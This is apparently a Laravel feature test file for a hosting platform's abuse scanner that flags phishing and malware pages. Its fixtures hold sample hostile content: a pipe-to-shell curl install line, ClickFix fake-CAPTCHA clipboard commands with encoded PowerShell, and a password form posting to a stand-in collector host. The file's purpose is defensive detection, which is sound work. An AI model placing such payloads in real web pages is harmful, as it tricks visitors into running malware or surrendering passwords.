<?php

namespace Tests\Feature;

use App\Abuse\LinkScanner;
use App\Models\Site;
use App\Models\User;
use Illuminate\Support\Facades\Http;
use Tests\TestCase;

/** What a site's pages send visitors to (App\Abuse\LinkScanner). */
class LinkScannerTest extends TestCase
{
    private function site(string $id = 'shopx'): Site
    {
        return Site::create(['user_id' => User::factory()->create(['email' => "$id@gmail.com"])->id, 'site_id' => $id,
            'domain' => "$id.codeinchrome.com", 'host' => 'h1', 'status' => 'live', 'cpu_limit' => '0.5', 'memory_limit' => '384m', 'port' => 20400]);
    }

    private function pages(array $pages): void
    {
        Http::fake(array_map(fn ($html) => Http::response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']), $pages)
            + ['*' => Http::response('not found', 404)]);
    }

    public function test_an_ordinary_site_is_clean_and_its_own_pages_are_followed(): void
    {
        $this->pages([
            'https://shopx.codeinchrome.com/' => '<a href="/about">About</a><a href="https://instagram.com/shop">Insta</a><a href="mailto:x@y.z">m</a>'
                .'<form action="/search"><input name="q"></form><a href="https://checkout.stripe.com/c/pay/1">Pay</a>',
            'https://shopx.codeinchrome.com/about' => '<a href="/files/menu.pdf">Menu</a><form method="post" action="/login"><input type="password" name="p"></form>',
        ]);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertSame([], $r['review']);
        $this->assertSame(2, $r['pages'], 'the /about page it links to was read too');
    }

    public function test_a_program_download_on_the_site_is_a_ban_and_one_elsewhere_is_a_review(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<a class="btn" href="/files/Setup.EXE">Download</a>'
            .'<a href="https://github.com/me/app/releases/download/v1/app.apk">Android</a>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertCount(1, $r['ban']);
        $this->assertStringContainsString('/files/Setup.EXE', $r['ban'][0]);
        // Anyone who can post a comment can plant a link elsewhere (the audit, 2026-09-25).
        $this->assertStringContainsString('program download elsewhere: https://github.com/me/app/releases/download/v1/app.apk', implode("\n", $r['review']));
    }

    public function test_a_copy_button_for_an_install_command_is_a_review_not_a_ban(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText)">Copy</button>'
            .'<pre>curl -fsSL https://get.example.dev/install.sh | bash</pre>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertStringContainsString("on the visitor's clipboard", implode("\n", $r['review']));
    }

    public function test_what_needs_a_persons_judgement_is_flagged_for_review(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<meta http-equiv="refresh" content="0; url=https://elsewhere.example/">'
            .'<a href="https://bit.ly/abc">Deal</a><a href="http://203.0.113.9/x">x</a><a href="https://mirror.example/pack.zip">zip</a>'
            .'<h1>Sign in to your PayPal account</h1><form method="post" action="https://collector.example/steal"><input type="password" name="pw"></form>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $review = implode("\n", $r['review']);
        // A meta refresh to another site is what the edge refuses as a header: a ban (the audit, 2026-09-25).
        $this->assertStringContainsString('meta refresh: https://elsewhere.example/', implode("\n", $r['ban']));
        foreach (['URL shortener', 'bare IP address', 'archive elsewhere',
            'a form posts what is typed to another site: collector.example', 'names "paypal": possible phishing'] as $want) {
            $this->assertStringContainsString($want, $review);
        }
    }

    public function test_lemon_squeezy_is_allowed_only_at_a_checkout(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<form method="post" action="https://store.lemonsqueezy.com/checkout/buy/abc"><button>Buy</button></form>'
            .'<meta http-equiv="refresh" content="0; url=https://attacker-store.lemonsqueezy.com/">']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['review'], 'the checkout is fine');
        $this->assertStringContainsString('attacker-store.lemonsqueezy.com', implode("\n", $r['ban']), 'any other store page is a redirect elsewhere');
    }

    public function test_the_command_bans_on_downloads_reports_the_rest_and_gates_explore(): void
    {
        config(['fleet.owner_notify_email' => 'owner@example.com', 'fleet.mail_enabled' => true, 'fleet.tokens' => ['h1' => 't']]);
        $clean = $this->site('cleanx');
        $bad = $this->site('badx');
        $this->pages([
            'https://cleanx.codeinchrome.com/' => '<a href="/">home</a>',
            'https://badx.codeinchrome.com/' => '<a href="/downloads/tool.msi">Get it</a>',
            '127.0.0.1:9441/*' => '{"ok":true}',
        ]);
        $this->artisan('abuse:links')->assertSuccessful();
        $this->assertNotNull($clean->fresh()->links_clean_at);
        $this->assertNull($bad->fresh()->links_clean_at);
        $this->assertNotNull($bad->user->fresh()->banned_at);
        $this->assertStringContainsString('tool.msi', $bad->user->fresh()->banned_reason);
    }

    public function test_explore_lists_only_sites_that_passed_both_checks(): void
    {
        $site = $this->site('listed');
        Http::fake(['*' => Http::response('<h1>A real site</h1>', 200, ['Content-Type' => 'text/html'])]);
        app(\App\Showcase\Explore::class)->refresh();
        $this->assertSame([], app(\App\Showcase\Explore::class)->listed(), 'not scanned yet: not listed');

        $site->forceFill(['scanned_clean_at' => now(), 'links_clean_at' => now(), 'created_at' => now()->subDays(8)])->save();
        app(\App\Showcase\Explore::class)->refresh();
        $this->assertSame(['listed.codeinchrome.com'], app(\App\Showcase\Explore::class)->listed());

        $site->forceFill(['links_clean_at' => null])->save();
        $this->assertSame([], app(\App\Showcase\Explore::class)->listed(), 'a site with links to review leaves the list at once');
    }

    public function test_a_home_page_that_redirects_within_the_site_is_followed(): void
    {
        Http::fake([
            'https://shopx.codeinchrome.com/' => Http::response('', 302, ['Location' => '/login']),
            'https://shopx.codeinchrome.com/login' => Http::response('<a href="/files/a.exe">x</a>', 200, ['Content-Type' => 'text/html']),
            '*' => Http::response('', 404),
        ]);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame(1, $r['pages']);
        $this->assertCount(1, $r['ban']);
    }

    public function test_a_clickfix_fake_captcha_is_a_ban(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<h1>Verify you are human</h1><button onclick="navigator.clipboard.writeText(\'powershell -w hidden -enc SQBFAFgA\')">I am not a robot</button>'
            .'<p>Press Windows + R, then Ctrl + V and Enter.</p>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertStringContainsString('ClickFix malware page', implode("\n", $r['ban']));
    }

    public function test_win_r_and_paste_instructions_alone_are_a_review(): void
    {
        // A separate test: a second Http::fake for the same address does not replace the first.
        $this->pages(['https://shopx.codeinchrome.com/' => '<p>To finish verification press Win + R and paste the code.</p>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertStringContainsString('possible ClickFix fake CAPTCHA', implode("\n", $r['review']));
    }

    public function test_a_copy_button_for_ordinary_text_is_not_flagged(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<button onclick="navigator.clipboard.writeText(\'SAVE10\')">Copy coupon</button><p>Use Ctrl + V at checkout.</p>']);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertSame([], $r['ban']);
        $this->assertSame([], $r['review']);
    }

    public function test_iframes_scripts_and_script_redirects_to_other_sites_are_reviewed_and_it_looks_like_a_browser(): void
    {
        $seen = [];
        Http::fake(function (\Illuminate\Http\Client\Request $r) use (&$seen) {
            if (str_contains($r->url(), 'shopx.codeinchrome.com')) { // the site's pages, not the agent's route list
                $seen[] = $r->header('User-Agent')[0] ?? '';
            }
            return Http::response('<iframe src="https://kit.example/login"></iframe><script src="https://cdn.evil.example/x.js"></script>'
                .'<script>setTimeout(() => { window.location.href = "https://kit.example/next"; }, 10)</script>'
                .'<script src="https://checkout.stripe.com/v3"></script>', 200, ['Content-Type' => 'text/html']);
        });
        $review = implode("\n", app(LinkScanner::class)->scan($this->site())['review']);
        foreach (['frames another site: https://kit.example/login', 'runs a script from another site: https://cdn.evil.example/x.js',
            'from a script: https://kit.example/next'] as $want) {
            $this->assertStringContainsString($want, $review);
        }
        $this->assertStringNotContainsString('stripe', $review, 'an allowed provider is fine');
        $this->assertStringStartsWith('Mozilla/5.0', $seen[0], 'no self-identifying User-Agent');
        $this->assertStringNotContainsString('codeinchrome', $seen[0]);
    }

    /** A fleet of three hosts; the agents render what $dom maps from URL to DOM. */
    public function test_a_page_padded_past_the_cap_is_checked_as_far_as_it_and_goes_to_review(): void
    {
        $pad = str_repeat(' ', LinkScanner::MAX_ANSWER_BYTES);
        $this->pages([
            // A download link before the cap is still a ban; what is hidden
            // after the padding is never read, and that the page ran on is
            // itself a review - padding cannot buy a kit a clean result.
            'https://shopx.codeinchrome.com/' => '<a href="/files/setup.exe">Get it</a>'.$pad.'<a href="https://evil.example/x.exe">x</a>',
        ]);
        $r = app(LinkScanner::class)->scan($this->site());
        $this->assertCount(1, $r['ban']);
        $this->assertStringContainsString('setup.exe', $r['ban'][0]);
        $this->assertSame(['a page larger than 4 MB, checked only as far as that (https://shopx.codeinchrome.com/)'], $r['review']);
    }

    private function rendering(array $html, array $dom, array &$renderedOn): void
    {
        config(['fleet.hosts' => ['h1' => ['ip' => '10.0.0.1', 'tunnel_port' => 9441, 'capacity' => 10],
            'h3' => ['ip' => '10.0.0.3', 'tunnel_port' => 9443, 'capacity' => 10], 'h4' => ['ip' => '10.0.0.4', 'tunnel_port' => 9444, 'capacity' => 10]],
            'fleet.tokens' => ['h1' => 't1', 'h3' => 't3', 'h4' => 't4']]);
        Http::fake(function ($request) use ($html, $dom, &$renderedOn) {
            if (str_ends_with(parse_url($request->url(), PHP_URL_PATH), '/v1/render')) {
                $renderedOn[] = parse_url($request->url(), PHP_URL_PORT);

                return Http::response(['ok' => true, 'render' => ['dom' => $dom[$request['url']] ?? '', 'ms' => 900]]);
            }

            return isset($html[$request->url()]) ? Http::response($html[$request->url()], 200, ['Content-Type' => 'text/html']) : Http::response('not found', 404);
        });
    }

    public function test_a_kit_built_by_javascript_is_found_in_the_rendered_page(): void
    {
        $renderedOn = [];
        // The HTML is innocent; the script writes a ClickFix page after load.
        $this->rendering(
            ['https://shopx.codeinchrome.com/' => '<p>Loading</p><script src="/app.js"></script>'],
            ['https://shopx.codeinchrome.com/' => '<p>Verify you are human: press Win+R, then Ctrl+V</p>'
                .'<script>navigator.clipboard.writeText("powershell -enc AAAA")</script>'],
            $renderedOn);
        $r = app(LinkScanner::class)->scan($this->site(), render: true);
        $this->assertCount(1, $r['ban'], implode("\n", $r['ban']));
        $this->assertStringContainsString('ClickFix', $r['ban'][0]);
        $this->assertStringContainsString('after its scripts ran', $r['ban'][0]);
        // Rendered by another host than the site's own (h1), whose address a kit could learn.
        $this->assertNotEmpty($renderedOn);
        $this->assertNotContains(9441, $renderedOn);
    }

    public function test_what_the_html_already_shows_is_not_reported_twice(): void
    {
        $renderedOn = [];
        $page = '<a href="https://bit.ly/x">deal</a>';
        $this->rendering(['https://shopx.codeinchrome.com/' => $page], ['https://shopx.codeinchrome.com/' => $page], $renderedOn);
        $r = app(LinkScanner::class)->scan($this->site(), render: true);
        $this->assertCount(1, $r['review'], implode("\n", $r['review']));
    }

    public function test_rendering_is_once_a_day_on_the_hourly_scan_and_always_for_a_report(): void
    {
        $renderedOn = [];
        $this->rendering(['https://shopx.codeinchrome.com/' => '<p>hi</p>'], ['https://shopx.codeinchrome.com/' => '<p>hi</p>'], $renderedOn);
        $site = $this->site();
        app(LinkScanner::class)->scan($site);
        app(LinkScanner::class)->scan($site);
        $this->assertCount(1, $renderedOn, 'the second hourly scan the same day renders nothing');
        app(LinkScanner::class)->scan($site, render: true);
        $this->assertCount(2, $renderedOn, 'a report renders regardless');
        $this->travel(25)->hours();
        app(LinkScanner::class)->scan($site);
        $this->assertCount(3, $renderedOn, 'and the next day it renders again');
    }

    public function test_a_renderer_that_fails_does_not_fail_the_scan(): void
    {
        config(['fleet.hosts' => ['h1' => ['ip' => '10.0.0.1', 'tunnel_port' => 9441, 'capacity' => 10], 'h3' => ['ip' => '10.0.0.3', 'tunnel_port' => 9443, 'capacity' => 10]],
            'fleet.tokens' => ['h1' => 't1', 'h3' => 't3']]);
        Http::fake(fn ($request) => str_contains($request->url(), '/v1/render')
            ? Http::response(['ok' => false, 'error' => 'cannot_render'], 400)
            : Http::response('<a href="https://bit.ly/x">deal</a>', 200, ['Content-Type' => 'text/html']));
        $r = app(LinkScanner::class)->scan($this->site(), render: true);
        $this->assertCount(1, $r['review'], 'the HTML is still read');
    }

    public function test_a_program_built_or_carried_by_the_pages_script_is_a_ban_and_a_csv_export_is_not(): void
    {
        $this->pages([
            'https://shopx.codeinchrome.com/' => '<a href="/export">export</a><script>const b = new Blob([bytes], {type: "application/octet-stream"});'
                .' const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "Setup.exe"; a.click();</script>',
            'https://shopx.codeinchrome.com/export' => '<script>const u = URL.createObjectURL(new Blob([rows.join("\\n")], {type: "text/csv"}));'
                .' link.download = "orders.csv";</script><p>data:application/octet-stream;base64,TVqQAAMAAAAEAAAA//8AALgAAAAA</p>',
        ]);
        $r = app(LinkScanner::class)->scan($this->site(), render: false);
        $this->assertCount(2, $r['ban'], implode("\n", $r['ban']));
        $this->assertStringContainsString('builds a program download', $r['ban'][0]);
        $this->assertStringEndsWith('(https://shopx.codeinchrome.com/)', $r['ban'][0], 'named on the page that builds it');
        $this->assertStringContainsString('carries a Windows program inside the page', $r['ban'][1]);
        $this->assertStringContainsString('/export', $r['ban'][1]);
    }

    public function test_a_csv_export_alone_is_not_flagged(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<script>a.href = URL.createObjectURL(new Blob([csv], {type: "text/csv"})); a.download = "orders.csv";</script>']);
        $r = app(LinkScanner::class)->scan($this->site(), render: false);
        $this->assertSame([], $r['ban']);
        $this->assertSame([], $r['review']);
    }

    public function test_the_sites_own_scripts_are_read_and_nobody_elses(): void
    {
        $fetched = [];
        Http::fake(function ($request) use (&$fetched) {
            $fetched[] = $request->url();

            return match ($request->url()) {
                'https://shopx.codeinchrome.com/' => Http::response('<p>Shop</p><script src="/js/app.js"></script><script src="https://cdn.example.test/lib.js"></script>', 200, ['Content-Type' => 'text/html']),
                'https://shopx.codeinchrome.com/js/app.js' => Http::response('document.querySelector("#v").onclick = () => { navigator.clipboard.writeText("powershell -enc AAAA"); };'
                    .' const x = URL.createObjectURL(blob); link.download = "update.msi";', 200, ['Content-Type' => 'text/javascript']),
                default => Http::response('not found', 404),
            };
        });
        $r = app(LinkScanner::class)->scan($this->site(), render: false);
        $this->assertStringContainsString('builds a program download', implode("\n", $r['ban']));
        $this->assertStringContainsString('/js/app.js, a script of https://shopx.codeinchrome.com/', implode("\n", $r['ban']));
        $this->assertStringContainsString("on the visitor's clipboard", implode("\n", $r['review']));
        $this->assertNotContains('https://cdn.example.test/lib.js', $fetched, "another host's script is not fetched");
        // It is still reviewed as a script from another site.
        $this->assertStringContainsString('runs a script from another site: https://cdn.example.test/lib.js', implode("\n", $r['review']));
    }

    public function test_at_most_five_of_the_sites_scripts_are_read(): void
    {
        $fetched = [];
        $tags = implode('', array_map(fn ($i) => "<script src=\"/js/$i.js\"></script>", range(1, 9)));
        Http::fake(function ($request) use (&$fetched, $tags) {
            $fetched[] = $request->url();

            return $request->url() === 'https://shopx.codeinchrome.com/'
                ? Http::response($tags, 200, ['Content-Type' => 'text/html'])
                : Http::response('// ok', 200, ['Content-Type' => 'text/javascript']);
        });
        app(LinkScanner::class)->scan($this->site(), render: false);
        $this->assertCount(5, array_filter($fetched, fn ($u) => str_contains($u, '/js/')));
    }

    public function test_cloudflares_own_analytics_beacon_is_not_the_sites_doing(): void
    {
        $this->pages(['https://shopx.codeinchrome.com/' => '<p>Shop</p><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95"></script>']);
        $r = app(LinkScanner::class)->scan($this->site(), render: false);
        $this->assertSame([], $r['review']);
    }
}

